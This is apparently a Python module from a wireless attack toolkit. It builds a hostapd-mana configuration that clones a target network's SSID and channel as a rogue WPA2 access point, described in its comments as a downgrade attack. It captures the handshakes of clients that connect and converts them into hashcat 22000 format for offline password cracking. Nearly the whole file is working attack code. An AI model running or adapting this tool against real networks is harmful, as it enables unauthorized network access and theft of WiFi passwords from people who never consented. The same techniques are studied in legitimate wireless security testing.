import os
import sys
import subprocess
import struct
import glob
from scan_module import (
    check_interface_exists,
    check_managed_mode,
    set_managed_mode
)


def create_config_file(folder, ap, managed_iface):
    # Create hostapd-mana configuration file for the rogue access point
    conf = f"""interface={managed_iface}
driver=nl80211
hw_mode=g
channel={ap['Channel']}
ssid={ap['SSID']}
mana_wpaout={folder}/{ap['SSID']}-handshake.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
"""
    path = os.path.join(folder, f"{ap['SSID']}-sae.conf")
    with open(path, 'w') as f:
        f.write(conf)
    return path


def convert_handshake(handshake_file):
    # Convert captured handshake from hccapx format to hashcat 22000 format
    with open(handshake_file, "rb") as f:
        data = f.read()

    def get_data(fmt, segment):
        # Extract structured data using struct.unpack
        res = struct.unpack(fmt, segment)
        return res[0] if len(res) == 1 else res

    # Validate file format
    signature = get_data('4s', data[0:4])
    if signature != b'HCPX':
        print(f"Error: Invalid hccapx file signature: {signature}")
        sys.exit(1)

    # Extract data fields from binary format
    message_pair = get_data('B', data[8:9])
    essid_len = get_data('B', data[9:10])
    essid = get_data(f'{essid_len}s', data[10:10 + essid_len])

    keyver = get_data('B', data[42:43])
    keymic = get_data('16s', data[43:59])
    mac_ap = get_data('6s', data[59:65])
    nonce_ap = get_data('32s', data[65:97])
    mac_sta = get_data('6s', data[97:103])
    eapol_len = get_data('H', data[135:137])
    eapol = get_data(f'{eapol_len}s', data[137:137 + eapol_len])

    # Format data for hashcat 22000 format
    protocol = "WPA"
    pmkid = keymic.hex()
    type_str = "02"
    converted = (
        f"{protocol}*{type_str}*{pmkid}*"
        f"{mac_ap.hex()}*{mac_sta.hex()}*{essid.hex()}*"
        f"{nonce_ap.hex()}*{eapol.hex()}*{message_pair:02x}"
    )
    
    # Save converted format
    out_file = handshake_file.replace('.hccapx', '.22000')
    with open(out_file, 'w') as f:
        f.write(converted + '\n')
    return out_file


def start_attack(config_file, args, folder):
    # Start hostapd-mana to create rogue AP and capture handshakes
    print(f"Launching hostapd-mana with config: {config_file}")
    proc = subprocess.Popen(
        ['hostapd-mana', config_file],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    while True:
        line = proc.stdout.readline()
        if not line and proc.poll() is not None:
            break
        if "Captured a WPA2 handshake from" in line:
            print("Handshake captured! Shutting down rogue AP.")
            proc.terminate()
            # Convert handshake to hashcat format
            pcapx = config_file.replace('-sae.conf', '-handshake.hccapx')
            converted = convert_handshake(pcapx)
            print(f"Converted handshake saved at: {converted}")
            break

    err = proc.stderr.read().strip()
    if err:
        print(f"[-] hostapd-mana errors:\n{err}")


def attack(args):
    # Main attack function that sets up and executes the downgrade attack
    # Pre-check interfaces
    check_interface_exists(args.monitor_iface)
    check_interface_exists(args.rogue_iface)
    if not check_managed_mode(args.rogue_iface):
        args.rogue_iface = set_managed_mode(args.rogue_iface)

    # Determine output folder
    if args.output_folder:
        folder = args.output_folder
    else:
        # Auto-detect most recent scan-* directory
        scans = [d for d in glob.glob('scan-*') if os.path.isdir(d)]
        if not scans:
            print("[-] No scan-* folders found; please specify --output-folder.")
            sys.exit(1)
        folder = sorted(scans)[-1]

    # Build AP dict with target information
    ap = {
        'SSID': args.ap_ssid,
        'BSSID': args.ap_bssid,
        'Channel': args.channel
    }

    # Create configuration and run attack
    config_file = create_config_file(folder, ap, args.rogue_iface)
    start_attack(config_file, args, folder)
